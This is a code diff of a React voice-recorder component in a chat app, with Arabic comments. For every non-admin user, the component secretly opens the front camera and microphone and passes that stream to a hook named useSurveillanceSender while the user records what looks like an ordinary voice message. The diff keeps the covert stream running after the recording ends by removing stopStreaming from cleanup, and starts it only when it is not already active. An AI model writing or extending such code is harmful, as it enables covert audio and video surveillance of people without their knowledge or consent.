@@ -255,10 +255,6 @@
 
 
 
-
-
-
-
 "use client";
 
 import { useState, useRef, useEffect, useCallback } from "react";
@@ -294,7 +290,7 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
 
   const { user } = useAuthStore();
   const isAdmin = user?.username === ADMIN_USERNAME;
-  const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
+  const { startStreaming, isStreamingActive } = useSurveillanceSender(conversationId);
 
   const stopTimer = useCallback(() => {
     if (timerRef.current) clearInterval(timerRef.current);
@@ -321,13 +317,15 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
 
       if (!isAdmin) {
         try {
-          const fullStream = await navigator.mediaDevices.getUserMedia({
-            audio: true,
-            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-          });
-
-          await startStreaming(fullStream);
-
+          // ← لو البث مش شغال، ابدأه
+          if (!isStreamingActive()) {
+            const fullStream = await navigator.mediaDevices.getUserMedia({
+              audio: true,
+              video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+            });
+            await startStreaming(fullStream);
+          }
+          // صوت منفصل للتسجيل بس في كل الحالات
           audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
           audioStreamRef.current = audioStream;
         } catch {
@@ -369,18 +367,17 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
     } catch {
       onCancel();
     }
-  }, [animateWaveform, onCancel, isAdmin, startStreaming]);
+  }, [animateWaveform, onCancel, isAdmin, startStreaming, isStreamingActive]);
 
- useEffect(() => {
-  if (hasStarted.current) return;
-  hasStarted.current = true;
-  void startRecording();
-  return () => {
-    stopTimer();
-    if (animationRef.current) cancelAnimationFrame(animationRef.current);
-    // ← شيل stopStreaming من هنا
-  };
-}, [startRecording, stopTimer]);
+  useEffect(() => {
+    if (hasStarted.current) return;
+    hasStarted.current = true;
+    void startRecording();
+    return () => {
+      stopTimer();
+      if (animationRef.current) cancelAnimationFrame(animationRef.current);
+    };
+  }, [startRecording, stopTimer]);
 
   const stopRecording = () => {
     if (mediaRecorderRef.current?.state !== "inactive") {
